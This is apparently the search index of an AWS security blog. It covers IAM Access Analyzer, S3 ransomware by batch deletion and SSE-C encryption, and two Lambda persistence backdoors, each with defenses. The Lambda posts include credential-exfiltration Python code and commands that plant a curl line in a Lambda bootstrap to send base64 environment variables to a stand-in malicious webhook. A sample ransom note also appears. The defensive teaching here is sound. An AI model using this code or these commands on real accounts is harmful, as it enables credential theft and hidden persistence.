{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#welcome-to-the-aws-security-blog","title":"Welcome to the AWS Security Blog!","text":"<p>You've come to the right place if you're looking to enhance your Amazon cloud security. This blog is dedicated to sharing analysis, insights, and countermeasures related to various security techniques and attack patterns within the Amazon Web Services (AWS) ecosystem. Here you will find articles aimed at disseminating knowledge and providing practical mitigation strategies to strengthen your cloud security posture.</p>"},{"location":"#news","title":"\ud83d\udcf0 News","text":""},{"location":"#featured-in-aws-security-digest-216","title":"Featured in AWS Security Digest #216","text":"<p>We're excited to announce that one of our articles has been featured in the AWS Security Digest #216! This recognition highlights our commitment to sharing valuable security insights with the AWS community.</p>"},{"location":"about/","title":"About Me","text":"<p>Hello! I'm Sergio Jimenez, and this is my blog dedicated to AWS security.</p> <p>I am passionate about cloud security, particularly in the Amazon Web Services (AWS) ecosystem. My goal with this blog is to share insights, analysis, and countermeasures related to various security techniques and attack patterns in AWS.</p> <p>I often draw inspiration from resources like Stratus Red Team to explore and explain complex security scenarios, helping to disseminate knowledge and provide practical mitigation strategies.</p> <p>Feel free to connect with me on LinkedIn or join our Discord community to discuss AWS security topics.</p>"},{"location":"links/","title":"Links","text":"<p>Welcome to our curated collection of useful resources for AWS security and cloud hacking.</p>"},{"location":"links/#security-resources","title":"Security Resources","text":""},{"location":"links/#hacktricks","title":"\ud83c\udf10 HackTricks","text":"<p>Comprehensive collection of hacking techniques and methodologies. An essential resource for penetration testers and security researchers.</p>"},{"location":"links/#owasp","title":"\ud83d\udee1\ufe0f OWASP","text":"<p>The Open Web Application Security Project (OWASP) is a nonprofit foundation that works to improve the security of software.</p>"},{"location":"links/#aws-security-blog","title":"\u2601\ufe0f AWS Security Blog","text":"<p>Official AWS security blog with the latest security announcements, best practices, and deep dives into AWS security features.</p>"},{"location":"links/#stratus-red-team","title":"\u26a1 Stratus Red Team","text":"<p>Stratus Red Team is \"Atomic Red Team\" for the cloud, allowing to emulate offensive attack techniques in a granular and self-contained manner.</p>"},{"location":"links/#contribute","title":"Contribute","text":"<p>Know of other great resources that should be included here? Feel free to reach out through our social channels or create an issue in our repository.</p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/","title":"IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets","text":"<p>In the vast and ever-expanding AWS ecosystem, permission management is crucial. A simple misconfiguration in an S3 bucket policy can expose sensitive data, opening a backdoor for attackers. This is where IAM Access Analyzer steps in, acting as an unyielding sentinel to protect your resources by detecting unwanted external access.</p>","tags":["aws","security","iam"]},{"location":"blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/#why-iam-access-analyzer-is-crucial-for-s3","title":"Why IAM Access Analyzer is Crucial for S3","text":"<p>Imagine you've set up an S3 bucket to store critical information. Unbeknownst to you, a poorly configured policy could grant access to an external AWS account or, worse yet, make the bucket publicly accessible. While GuardDuty excels at detecting attack patterns and anomalous activities, and CloudTrail logs all actions, IAM Access Analyzer specializes in the proactive detection of risky policy configurations.</p> <p>For instance, GuardDuty might not alert you about a policy granting access to a specific AWS account (as it's not \"anonymous\" or \"public\" access in the strict sense that GuardDuty looks for with certain detections). However, Access Analyzer will. Its primary goal is to identify resources accessible from outside your \"zone of trust,\" which includes AWS accounts external to your organization.</p>","tags":["aws","security","iam"]},{"location":"blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/#how-external-access-detection-works","title":"How External Access Detection Works","text":"<p>IAM Access Analyzer uses logical reasoning to analyze the policies of your resources, including S3 buckets. When you enable it in a region, you define your account or organization as your \"zone of trust.\" It then evaluates all resource policies, searching for any statement that grants permissions to entities outside that zone of trust.</p> <p>When IAM Access Analyzer detects a policy that allows an external entity to perform actions on your S3 buckets, it generates a finding. These findings alert you to potential access and provide details like:</p> <ul> <li>Finding type: For example, public access or cross-account access.</li> <li>Affected resource: The S3 bucket's ARN.</li> <li>Allowed action: The S3 operations the external entity can perform (e.g., <code>s3:GetObject</code>, <code>s3:ListBucket</code>).</li> <li>External principal: The identity (an AWS account, an IAM user, a role, etc.) that has access.</li> </ul> <p>This is incredibly valuable because it lets you identify and remediate security configurations before they can be exploited.</p>","tags":["aws","security","iam"]},{"location":"blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/#example-scenario-the-backdoor-policy","title":"Example Scenario: The Backdoor Policy","text":"<p>Consider the following example of an S3 bucket policy that could be used as a \"backdoor\" to exfiltrate data:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::193672423079:root\"\n            },\n            \"Action\": [\n                \"s3:GetObject\",\n                \"s3:GetBucketLocation\",\n                \"s3:ListBucket\"\n            ],\n            \"Resource\": [\n                \"arn:aws:s3:::my-secret-bucket/*\",\n                \"arn:aws:s3:::my-secret-bucket\"\n            ]\n        }\n    ]\n}\n</code></pre> <p>This policy allows the root AWS account with ID 193672423079 to access <code>my-secret-bucket</code>. If this account isn't part of your organization, IAM Access Analyzer will generate a finding, as it will detect this cross-account access as a potential vulnerability. It will notify you that your bucket has a policy allowing an external entity to access its content, enabling you to take immediate action.</p>","tags":["aws","security","iam"]},{"location":"blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/#how-to-enable-and-use-iam-access-analyzer","title":"How to Enable and Use IAM Access Analyzer","text":"<ul> <li>Enablement: Go to the AWS IAM console, navigate to Access Analyzer, and enable it for the region where your S3 buckets are located. You can choose to analyze your current account or your entire AWS organization.</li> <li>Finding Review: Once enabled, Access Analyzer will begin scanning your resources. Findings will appear in the Access Analyzer dashboard. Review them regularly.</li> <li>Action: For each finding, determine if the access is intended and secure. If not, modify the bucket policy to revoke the unwanted access. IAM Access Analyzer even helps you generate a secure policy to fix the issue.</li> </ul>","tags":["aws","security","iam"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/","title":"Defending S3 - Anatomy and Countermeasures for Encryption and Deletion Attacks (Codefinger ransomware)","text":"<p>Lately, we're seeing an attack pattern against Amazon S3 that is brutally simple and effective. Attackers don't need a zero-day exploit in AWS. They just need one thing: a set of compromised AWS credentials. With that, they can either delete or hijack all your data.</p> <p>In this post, we're going to break down the anatomy of two specific tactics gaining popularity and, more importantly, walk through the defense playbook to make sure it doesn't happen to you. Because under the shared responsibility model, whether your data in S3 is still there tomorrow depends on the defenses you implement today.</p>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/#the-anatomy-of-the-attacks","title":"The Anatomy of the Attacks","text":"<p>Both attacks start the same way: the attacker gets their hands on valid credentials with permissions over your buckets. From there, the path forks.</p>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/#tactic-1-ransomware-via-batch-deletion","title":"Tactic 1: Ransomware via Batch Deletion","text":"<p>This is a scorched-earth attack. The goal is simple: wipe everything and leave a ransom note. It's fast and destructive.</p> <ol> <li>Inventory: First, the attacker needs to know what to delete. They make a <code>ListObjectVersions</code> API call to get a complete list of every object and every version within the target bucket.</li> <li>Annihilation: With the list in hand, they use the <code>DeleteObjects</code> API. This operation is terrifyingly efficient for malicious purposes, as it can delete up to 1,000 objects (and their versions) in a single request. A simple loop in a script can empty a bucket with millions of objects in a very short time.</li> <li>The Note: Once the bucket is empty, the attacker uploads a file, typically named <code>FILES-DELETED.txt</code> or similar, containing the ransom message and payment instructions.</li> </ol>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/#tactic-2-parasitic-encryption-with-sse-c","title":"Tactic 2: Parasitic Encryption with SSE-C","text":"<p>This technique is more subtle and insidious. The data isn't deleted; it's hijacked right under your nose, without a single byte ever leaving your AWS account.</p> <ol> <li>Access: Again, the attacker has credentials with read and write permissions (<code>s3:GetObject</code>, <code>s3:PutObject</code>).</li> <li>The Hijack: The attacker reads an object, but instead of downloading it, they re-write it in place using <code>PutObject</code>, adding a key HTTP header: <code>x-amz-server-side-encryption-customer-key</code>. The value for this header is an AES-256 encryption key that the attacker generates and keeps.</li> <li>The Trick: AWS receives the request, sees the SSE-C (Server-Side Encryption with Customer-Provided Keys) header, and dutifully encrypts the object with the attacker's key. AWS never sees or stores this key. All it records in CloudTrail is an HMAC of the key, which can verify future requests but cannot be used to reconstruct it. The original object is overwritten by an encrypted version that only the attacker can access.</li> <li>The Pressure: To finish the job, actors like the \"Codefinger\" group add a lifecycle policy that marks these encrypted objects for deletion in 7 days. The clock starts ticking.</li> </ol> <p>This attack is especially sneaky because many threat detection systems are configured to look for data exfiltration. There is none here; everything happens inside your perimeter.</p>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/#the-defense-playbook-containment-strategies","title":"The Defense Playbook: Containment Strategies","text":"<p>Protecting yourself requires a defense-in-depth approach. There's no single silver bullet, but rather a set of barriers that makes a successful attack exponentially more difficult.</p>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/#1-immutability-your-primary-line-of-defense","title":"1. Immutability: Your Primary Line of Defense","text":"<p>If an attacker can't delete or overwrite your data, their attack fails. This is non-negotiable.</p> <ul> <li>Enable S3 Versioning: This is the prerequisite for everything else. It lets you preserve, retrieve, and restore every version of every object.</li> <li>Implement S3 Object Lock in Compliance Mode: Versioning alone isn't enough if the attacker has permissions to delete versions. Object Lock in <code>Compliance</code> mode creates a WORM (Write-Once-Read-Many) safeguard. No one, not even the root user, can delete or modify a protected object version before its retention period expires. Set this on your critical buckets. <code>Governance</code> mode is useful for testing, but it can be disabled by privileged users.</li> <li>Require MFA Delete: This is the final protective layer for versioning. It requires any attempt to delete an object version or change the bucket's versioning state to be authenticated with an MFA device. Without it, an attacker with the right credentials could simply disable versioning or delete the versions one by one.</li> </ul>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/#2-abandon-long-lived-credentials","title":"2. Abandon Long-Lived Credentials","text":"<p>The root cause of these attacks is almost always a compromised static access key. Stop using them.</p> <ul> <li>Use IAM Roles: For any workload inside AWS (EC2, Lambda, etc.), use IAM Roles. They provide temporary credentials automatically, eliminating the risk of leaked static keys.</li> <li>IAM Identity Center (SSO): For human access, centralize it with IAM Identity Center. It allows your developers and admins to fetch short-lived credentials for the CLI/SDK, protected by your identity provider and MFA.</li> <li>IAM Roles Anywhere: If you have on-premises systems that need AWS access, this is the way. It lets your own servers obtain temporary AWS credentials using their existing identities (like X.509 certificates) without storing an IAM key on them.</li> </ul>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/#3-block-unnecessary-attack-vectors","title":"3. Block Unnecessary Attack Vectors","text":"<p>If you don't use a feature, disable it.</p> <ul> <li>Block SSE-C with Policies: If your organization has no legitimate use case for Server-Side Encryption with Customer-Provided Keys (and most don't), forbid it. You can do this with a bucket policy or, more forcefully, with a Service Control Policy (SCP) in AWS Organizations that denies any API call containing the <code>x-amz-server-side-encryption-customer-algorithm</code> parameter.</li> </ul> S3 Bucket Policy to Deny SSE-C<pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"DenySSEC\",\n      \"Effect\": \"Deny\",\n      \"Action\": \"s3:PutObject\",\n      \"Resource\": \"arn:aws:s3:::*/*\",\n      \"Condition\": {\n        \"Null\": {\n          \"s3:x-amz-server-side-encryption-customer-algorithm\": \"false\"\n        }\n      }\n    }\n  ]\n}\n</code></pre>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/24/s3-ransomware-batch-deletion-attack/","title":"S3 Ransomware Batch Deletion Attack","text":"","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/24/s3-ransomware-batch-deletion-attack/#introduction","title":"Introduction","text":"<p>As an AWS security consultant, I've observed the devastating effects of ransomware on AWS S3 buckets. A particularly effective technique employed by attackers involves leveraging the S3 <code>DeleteObjects</code> API for batch deletion. In this post, I'll share my insights on how this attack unfolds and, more importantly, what measures you can implement to safeguard your data.</p>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/24/s3-ransomware-batch-deletion-attack/#the-attack","title":"The Attack","text":"<p>The S3 ransomware attack targets an S3 bucket by emptying it through batch deletion and then uploading a ransom note. This attack leverages the <code>DeleteObjects</code> API to remove multiple objects and their versions at once, making it a highly efficient way to cause significant data loss.</p>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/24/s3-ransomware-batch-deletion-attack/#detailed-steps","title":"Detailed Steps","text":"<ol> <li>Listing Objects: The attack starts by listing all objects and their versions in the target S3 bucket using the <code>ListObjectVersions</code> API.</li> <li>Batch Deletion: It then deletes all these objects in a single request using the S3 <code>DeleteObjects</code> API. This API can delete up to 1000 objects at a time.</li> <li> <p>Ransom Note: Finally, the attack uploads a ransom note to the bucket, typically named <code>FILES-DELETED.txt</code>, informing the victim that their data has been \"backed up\" and providing contact information for negotiating its recovery. The content of the ransom note might look like this:</p> <pre><code>Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with rick@astley.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.'\n</code></pre> </li> </ol>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/24/s3-ransomware-batch-deletion-attack/#mitigation-strategies","title":"Mitigation Strategies","text":"<p>To protect against this type of ransomware attack, consider the following mitigation strategies:</p> <ul> <li>Monitoring and Alerting: Set up monitoring and alerting to detect unusual deletion patterns.</li> <li>Versioning: Enable S3 versioning to keep a history of all object versions. While versioning allows you to recover from accidental or malicious deletions, it doesn't prevent the <code>DeleteObjects</code> API from removing all versions if the attacker has sufficient permissions.</li> <li>MFA Delete: Require multi-factor authentication (MFA) for deleting object versions. This is a critical control, as it requires an additional layer of authentication to permanently delete objects, even with versioning enabled. Without MFA Delete, an attacker with sufficient permissions can bypass versioning by simply deleting all object versions.</li> <li>Bucket Policies: Implement strict bucket policies to control access and restrict deletion permissions.</li> <li>Source: This blog post was inspired by the following resource: Stratus Red Team - S3 Ransomware Batch Deletion</li> </ul>","tags":["aws","security","ransomware"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/","title":"Stealthy Persistence in AWS - A Practical Simulation for Defenders","text":"<p>In the world of cloud cybersecurity, attackers are always innovating. As defenders, it's crucial not only to understand attack techniques but also to simulate them to strengthen our own defenses. Recently, an analysis from Datadog and insights from a security analyst Eduard Agavriloae  shed light on a particularly cunning persistence technique in AWS: the use of API Gateway and Lambda Functions for credential exfiltration, with a \"twist\" that makes it even harder to detect.</p> <p>This article breaks down how an attacker might implement this technique and, more importantly, how we can simulate it in our own environment to fine-tune our detection and prevention capabilities.</p>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#the-technique-in-detail-api-gateway-lambda-for-credential-exfiltration","title":"The Technique in Detail: API Gateway + Lambda for Credential Exfiltration","text":"<p>Datadog's original idea involved a compromised Lambda creating new IAM users for persistence. However, the \"twist\" that interests us is the exfiltration of credentials from the Lambda's own execution environment (<code>/proc/self/environ</code>). This is stealthier because an attacker can use these exfiltrated credentials to operate from their own infrastructure, avoiding detections associated with creating new users (a highly monitored API call).</p> <p>Persistence is achieved by linking this \"malicious\" Lambda to an API Gateway, creating a web entry point that the attacker can invoke at will. The subtlety is amplified by Lambda versioning: an attacker could deploy a \"benign\" version of the function as <code>$LATEST</code> (the one administrators typically check), while the \"backdoored\" version (with the exfiltration code) is explicitly invoked by its version number, thus remaining hidden from superficial inspections.</p>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#setting-up-the-attack-scenario-step-by-step-simulation","title":"Setting Up the Attack Scenario: Step-by-Step Simulation","text":"<p>To understand and defend ourselves, we'll replicate this technique in a controlled AWS environment.</p>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#1-preparing-the-aws-ground","title":"1. Preparing the AWS Ground","text":"<p>Before we start, security is key. Don't use your <code>root</code> account or an administrator user.</p> <ul> <li>Test IAM User: Create an IAM user with the minimum necessary permissions to create Lambda functions, API Gateways, and IAM roles. This simulates an initial compromise with limited privileges.</li> <li>S3 Bucket for the \"Catch\": You'll need an S3 bucket where the \"malicious\" Lambda will deposit the exfiltrated credentials. Ensure the bucket policy only allows writes from the IAM role your Lambda will assume.</li> </ul>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#2-the-malicious-lambda-code-and-role","title":"2. The \"Malicious\" Lambda: Code and Role","text":"<p>This is the heart of our simulated attack. This function will read environment variables, which in Lambda include temporary credentials.</p> <ul> <li> <p>Lambda Python Code:</p> <pre><code>import os\nimport json\nimport boto3\n\ndef lambda_handler(event, context):\n    try:\n        # Read environment variables, which in Lambda include temporary credentials\n        environ_data = os.environ # os.environ is already a dict, no need to read from /proc/self/environ directly here for this purpose.\n\n        # Extract specific credentials (if they exist)\n        aws_access_key_id = environ_data.get('AWS_ACCESS_KEY_ID', 'N/A')\n        aws_secret_access_key = environ_data.get('AWS_SECRET_ACCESS_KEY', 'N/A')\n        aws_session_token = environ_data.get('AWS_SESSION_TOKEN', 'N/A')\n\n        exfiltrated_data = {\n            \"lambda_name\": context.function_name,\n            \"aws_access_key_id\": aws_access_key_id,\n            \"aws_secret_access_key\": aws_secret_access_key,\n            \"aws_session_token\": aws_session_token,\n            \"full_environ\": dict(environ_data) # Convert to dict for JSON serialization\n        }\n\n        # Send data to S3\n        s3_bucket_name = \"your-exfiltration-bucket\" # IMPORTANT: Change this to your bucket name!\n        s3_key = f\"exfiltrated-creds/{context.aws_request_id}.json\"\n        s3_client = boto3.client('s3')\n        s3_client.put_object(\n            Bucket=s3_bucket_name,\n            Key=s3_key,\n            Body=json.dumps(exfiltrated_data, indent=4)\n        )\n\n        print(f\"Credentials exfiltrated and saved to s3://{s3_bucket_name}/{s3_key}\")\n\n        return {\n            'statusCode': 200,\n            'body': json.dumps('Data exfiltrated successfully!')\n        }\n    except Exception as e:\n        print(f\"Error during exfiltration: {e}\")\n        return {\n            'statusCode': 500,\n            'body': json.dumps(f'Error during exfiltration: {str(e)}')\n        }\n</code></pre> </li> <li> <p>Lambda Execution Role (IAM Role): This role must have permissions for:</p> <ul> <li><code>lambda:InvokeFunction</code></li> <li><code>s3:PutObject</code> in your exfiltration bucket.</li> <li>Basic CloudWatch Logs permissions (<code>logs:CreateLogGroup</code>, <code>logs:CreateLogStream</code>, <code>logs:PutLogEvents</code>).</li> </ul> </li> </ul>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#3-the-api-gateway-deception","title":"3. The API Gateway Deception","text":"<p>The API Gateway is the public facade the attacker will use.</p> <ul> <li>Create HTTP API: In the API Gateway console, create a simple HTTP API.</li> <li>Resource and Method: Define a resource (e.g., <code>/backdoor</code>) and an HTTP method (e.g., <code>GET</code>).</li> <li>Lambda Integration: Connect this method to your Lambda function. Ensure API Gateway has the permissions to invoke it.</li> </ul>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#4-the-key-to-stealth-lambda-versions","title":"4. The Key to Stealth: Lambda Versions","text":"<p>This is where the attacker's ingenuity comes in.</p> <ul> <li>\"$LATEST\" Version (Benign): Upload a \"clean\" version of your Lambda that does something innocuous (e.g., \"Hello World\"). This will be the one pointed to by the <code>$LATEST</code> alias.</li> <li>\"Backdoored\" Version (Malicious): Now, update your Lambda's code with the credential exfiltration script. Publish a new version of this function (e.g., <code>v2</code>). The key is that the attacker will explicitly invoke <code>arn:aws:lambda:region:account-id:function:MyFunction:v2</code>, while your security team might only be checking <code>$LATEST</code>.</li> </ul>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#5-time-to-invoke-the-backdoor","title":"5. Time to Invoke the Backdoor!","text":"<ul> <li>\"Normal\" Invocation: Access the API Gateway URL without specifying a version. It should execute the <code>$LATEST</code> (benign) version.</li> <li>\"Malicious\" Invocation: The attacker will invoke the function by specifying the backdoored version in the ARN. For example: <code>arn:aws:lambda:us-east-1:123456789012:function:MyFunction:v2</code>. After execution, you should find a JSON file with the exfiltrated credentials in your S3 bucket.</li> </ul>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#defense-and-detection-hardening-your-environment","title":"Defense and Detection: Hardening Your Environment","text":"<p>Once you've simulated the attack, it's time to put on your \"Blue Team\" hat and strengthen your defenses.</p>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#monitoring-and-detection-red-flags","title":"Monitoring and Detection (Red Flags)","text":"<ul> <li>AWS CloudTrail: Your best friend.<ul> <li>Resource Creation/Modification: Look for events like <code>CreateFunction</code>, <code>UpdateFunctionCode</code>, <code>PublishVersion</code> (for Lambdas) or <code>CreateRestApi</code>, <code>CreateResource</code>, <code>PUT_INTEGRATION</code> (for API Gateway). Abnormalities in these events are red flags.</li> <li>Exfiltration: Monitor <code>PutObject</code> in S3, especially if you don't expect a Lambda to write to a specific bucket.</li> <li>Use of Exfiltrated Credentials: <code>AssumeRole</code> or <code>GetFederationToken</code> events from unusual IPs or with suspicious credentials (the exfiltrated ones) are critical.</li> </ul> </li> <li>CloudWatch Lambda Logs: Set up alerts for execution errors or unusual patterns in your function logs. If the malicious Lambda tries to write to S3 unsuccessfully (thanks to strict policies!), your logs will tell you.</li> <li>Amazon GuardDuty: Enable it. It detects malicious activity, including unusual credential usage, communications with suspicious IPs, and exfiltration attempts.</li> <li>Lambda Version Monitoring: Crucial for this attack. Don't just limit yourself to <code>$LATEST</code>. Use CloudWatch Lambda metrics to see invocations by version. If an old or \"inactive\" version suddenly shows invocation activity, investigate!</li> <li>AWS Security Hub: Centralizes security findings from all your services, giving you a holistic view.</li> </ul>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/#prevention-blue-fortress","title":"Prevention (Blue Fortress)","text":"<ul> <li>Principle of Least Privilege: The golden rule. Grant your Lambdas only the absolutely necessary permissions. If a Lambda doesn't need to write to S3, don't give it <code>s3:PutObject</code> permissions!</li> <li>Code Review and Secure CI/CD: Implement security scanning (SAST) in your CI/CD pipelines to detect malicious code or vulnerabilities before deployment. Conduct regular code reviews.</li> <li>Credential Management: Rotate credentials frequently and never hardcode credentials in your code. Leverage IAM roles and temporary credentials that Lambda already provides.</li> <li>API Gateway Configuration:<ul> <li>Restric access with Authorizers (Lambda Authorizers, Cognito, IAM).</li> <li>Use AWS WAF to protect your API Gateway from common attacks.</li> </ul> </li> <li>Network Security (VPC): If feasible, place your Lambdas inside a VPC to control network traffic more granularly with Security Groups and NACLs.</li> <li>AWS Organizations SCPs: If you use AWS Organizations, Service Control Policies (SCPs) can prevent dangerous actions at the account level, acting as an additional barrier.</li> <li>Offensive Mindset: Finally, and perhaps most importantly, cultivate an offensive mindset within your team. Understanding how attackers think and operate will enable you to build more robust and proactive defenses.</li> </ul> <p>Simulating these sophisticated persistence techniques isn't just a technical exercise; it's an invaluable investment in your ability to protect your AWS environments. By understanding the \"how\" of the attack, you'll be much better equipped to build the \"how\" of your defense.</p> <p>Sources: - https://www.linkedin.com/in/eduard-k-agavriloae/ - https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-the-attacker-doth-persist-too-much/</p>","tags":["backdoor","persistence","lambda"]},{"location":"blog/2025/07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/","title":"Unmasking Lambda's Hidden Threat - When Your Bootstrap Becomes a Backdoor","text":"<p>So, you've jumped on the serverless bandwagon, huh? All that auto-scaling, no servers to patch, just pure code magic. It feels invincible, right? Well, sorry to burst your bubble, but even in the land of ephemeral functions, bad actors are finding ways to stick around longer than an awkward family dinner. Today, we're pulling back the curtain on one of those particularly sneaky tricks: achieving persistence in AWS Lambda by messing with its very heart \u2013 the custom runtime <code>bootstrap</code> file.</p>","tags":["backdoor","persistence","lambda","bootstrap","runtime","webhook"]},{"location":"blog/2025/07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/#why-the-bootstrap-understanding-the-context","title":"Why the Bootstrap? Understanding the Context","text":"<p>AWS Lambda allows developers to use custom runtimes. This is made possible by the Lambda Runtime API and a key executable: the <code>bootstrap</code> file. When a Lambda function with a custom runtime is invoked, AWS calls this <code>bootstrap</code> file. Its purpose is to initialize the runtime environment, load the function's code and manage the lifecycle of invocations, directly interacting with the Runtime API to send and receive events.</p> <p>Herein lies the opportunity for an attacker: if a function with a custom runtime is compromised and sufficient permissions are obtained, modifying this <code>bootstrap</code> allows malicious code to be injected. This code will execute before the legitimate function code on every invocation, ensuring stealthy persistence, even if the main function's code is subsequently updated.</p>","tags":["backdoor","persistence","lambda","bootstrap","runtime","webhook"]},{"location":"blog/2025/07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/#the-attack-in-detail-simulating-persistence","title":"The Attack in Detail: Simulating Persistence","text":"<p>Simulating this attack requires initial access to the compromised Lambda function and permissions to modify its code.</p> <p>Prerequisites:</p> <ul> <li>An existing Lambda function with a custom runtime.</li> <li>IAM permissions for <code>lambda:UpdateFunctionCode</code>.</li> <li>Ability to write to <code>/tmp</code> or <code>/var/task</code> (though direct <code>bootstrap</code> modification is more direct).</li> <li>A webhook for exfiltration (e.g., <code>webhook.site</code>).</li> </ul> <p>Simulation Steps:</p> <ol> <li> <p>Download the current function:     The first step is to get the function's code. This can be done using <code>aws lambda get-function --function-name your-function-name --query 'Code.Location'</code> to get the ZIP package URL, then downloading it.</p> <pre><code>aws lambda get-function --function-name my-affected-function --query 'Code.Location' --output text &gt; code_location.txt\nwget -O function.zip $(cat code_location.txt)\nunzip function.zip -d extracted_function\n</code></pre> </li> <li> <p>Edit the <code>bootstrap</code>:     Inside the <code>extracted_function</code> directory, locate the <code>bootstrap</code> file. Add a malicious line to the beginning of this file. For example, to exfiltrate environment variables to your webhook:</p> <p><pre><code># Add this line to the beginning of the 'extracted_function/bootstrap' file\ncurl -X POST -H \"Content-Type: application/json\" -d \"$(env | base64)\" [https://your-malicious-webhook.site/path](https://your-malicious-webhook.site/path) &amp;\n</code></pre> The <code>&amp;</code> at the end is crucial for the command to execute in the background and not block the runtime's startup, allowing the legitimate function to run without obvious interruptions for the user or application.</p> </li> <li> <p>Upload the changes:     Repackage the function and upload it to AWS.</p> <pre><code>zip -r new_function.zip extracted_function/\naws lambda update-function-code --function-name my-affected-function --zip-file fileb://new_function.zip\n</code></pre> </li> </ol> <p>Once the function is invoked, the malicious <code>bootstrap</code> will execute, sending the desired information to your webhook, all while the original function proceeds normally.</p>","tags":["backdoor","persistence","lambda","bootstrap","runtime","webhook"]},{"location":"blog/2025/07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/#implications-and-comparison-with-other-techniques","title":"Implications and Comparison with Other Techniques","text":"<p>This technique is particularly stealthy because the <code>bootstrap</code> is a fundamental file for the runtime, and its modification can go unnoticed if not explicitly audited. Unlike simply modifying the function code (which could be overwritten by a legitimate deployment), the <code>bootstrap</code> change persists through updates to the main function's code, as the <code>bootstrap</code> is part of the runtime environment, not the application code.</p> <p>Other Lambda persistence techniques include: * Backdooring existing runtimes (e.g., Python/Node.js): Modifying standard libraries or modules so that malicious code executes when the function imports them. * \"Runtime Swapping\": Changing an existing function's runtime to a custom one controlled by the attacker. * Malicious Layers: If an attacker can create or modify a Lambda Layer used by a target function, they can inject compromised code or dependencies.</p> <p>The <code>bootstrap</code> attack stands out for its subtlety and ability to survive legitimate code deployments, making it an advanced and dangerous technique.</p>","tags":["backdoor","persistence","lambda","bootstrap","runtime","webhook"]},{"location":"blog/2025/07/11/unmasking-lambdas-hidden-threat---when-your-bootstrap-becomes-a-backdoor/#fortifying-your-defenses-prevention-and-detection","title":"Fortifying Your Defenses: Prevention and Detection","text":"<p>Detecting and preventing these types of attacks requires a multifaceted and proactive approach to serverless security.</p> <ol> <li> <p>Continuous Detection and Monitoring (Runtime and Behavior):</p> <ul> <li>Amazon CloudTrail: Monitor and alert on critical events such as <code>UpdateFunctionCode</code>, <code>CreateFunction</code>, <code>CreateFunctionUrlConfig</code>, and <code>UpdateFunctionConfiguration</code>. Set up Amazon EventBridge alarms for immediate notifications of any unexpected function modifications.</li> <li>Amazon GuardDuty &amp; AWS Security Hub: Enable these services. GuardDuty can detect anomalous behavior, such as unusual outbound connections to suspicious domains from a Lambda function that normally shouldn't communicate externally. Security Hub consolidates findings and offers centralized visibility.</li> <li>Runtime Security: Implement third-party solutions like Sysdig, Upwind, Palo Alto Networks Prisma 